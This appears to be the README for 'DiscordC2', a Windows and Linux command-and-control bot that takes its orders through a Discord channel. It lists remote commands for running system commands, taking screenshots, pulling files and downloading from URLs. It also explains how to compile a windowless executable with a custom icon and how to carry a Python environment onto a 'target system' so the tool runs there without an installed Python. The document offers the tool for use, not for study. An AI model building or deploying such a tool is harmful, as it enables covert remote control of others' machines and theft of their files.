# DiscordC2 - Windows And Linux

## Setup Instructions
1. Change User\Channel ID
2. Add Bot Token
3. Run `pip install -r requirements.txt`

## Bot Commands
- `!helpme`: Show bot commands
- `!cmd`: Run system command
- `!screenshot`: Take system screenshot
- `!get`: Get file from system
- `!download_file`: Download a file from URL
- `!ping`: Ping back

## Compile to Executable (Windows)
1. Run `pip install pyinstaller`
2. Run `pyinstaller --clean --onefile --noconsole --icon icon.ico DiscordC2.py`

For running without installed Python:
- Download Python 3.12.x - Windows embeddable package (64-bit) - https://www.python.org/ftp/python/3.12.4/python-3.12.4-embed-amd64.zip
- create a virtual env:
-- python -m venv venv
-- Activate the env and install the reqs
- copy the venv folder to the target system
- add the packages to the script:
```
# Get the directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))

# Path to the virtual environment
venv_path = os.path.join(script_dir, 'venv')

# add site-packages to the sys.path
site_packages = os.path.join(venv_path, 'Lib', 'site-packages')
sys.path.insert(0, site_packages)
```
